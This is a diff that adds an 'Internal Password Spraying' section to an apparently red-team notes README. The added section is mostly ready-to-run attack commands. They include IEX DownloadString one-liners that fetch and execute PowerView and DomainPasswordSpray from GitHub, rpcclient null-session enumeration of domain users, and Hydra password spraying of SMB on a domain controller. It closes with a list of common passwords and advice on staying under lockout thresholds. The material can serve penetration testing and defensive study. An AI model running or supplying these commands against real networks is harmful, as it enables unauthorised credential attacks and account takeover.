@@ -78,6 +78,63 @@ Machine 10.0.2.7 asks for an unknown host, then the attacker machine 10.0.2.15 r
 
 ![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen4.png?raw=true)
 
+## Internal Password Spraying
+
+### Get domain users using powerview
+```
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1");
+Get-DomainUser | select samaccountname > users.txt
+```
+
+### Get domain users using rpcclient
+```
+nmap -Pn -sS -p389 --open 10.10.0.0/16 // Find Domain Controller
+
+rpcclient -U "" -N 10.10.1.50 // Authenticate Using Null Session
+rpcclient -U "MEGA\hsaad" 10.10.1.50 // Authenticate Using Domain User & Password
+>> enumdomusers // Enumerate All Domain Users
+```
+
+### Get domain password policy using powerview
+
+```
+(Get-DomainPolicy)."SystemAccess"
+```
+
+### Get domain password policy using rpcclient
+```
+>> getdompwinfo
+```
+
+### Password Spraying Using Hydra
+
+Don't forget the lockout threshold if it exists, for example, if it set for 5 tries in 30 minutes, then can only try 4 failed attempts on every account every 30 minutes.
+```
+hydra -V -L users.txt -P pass.txt -m MEGA.local -t 1 10.10.1.50 smb
+hydra -V -L users.txt -e nsr -m MEGA.local -t 1 10.10.1.50 smb
+```
+
+### Password Spraying Using DomainPasswordSpray
+By default, the tool will enumerate the users in the domain, then will filter from them any disabled account or any account that reaches the limit of the lockout.
+```
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1");
+Invoke-DomainPasswordSpray -Password Spring2017
+Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passlist.txt
+```
+
+### Common Passwords
+```
+12345
+123456
+123456789
+P@ssw0rd
+P@ssword
+P@ssword@123
+password@123
+Company_name@123
+admin@123
+```
+
 ## Sniffing
 
 ### ARPspoof
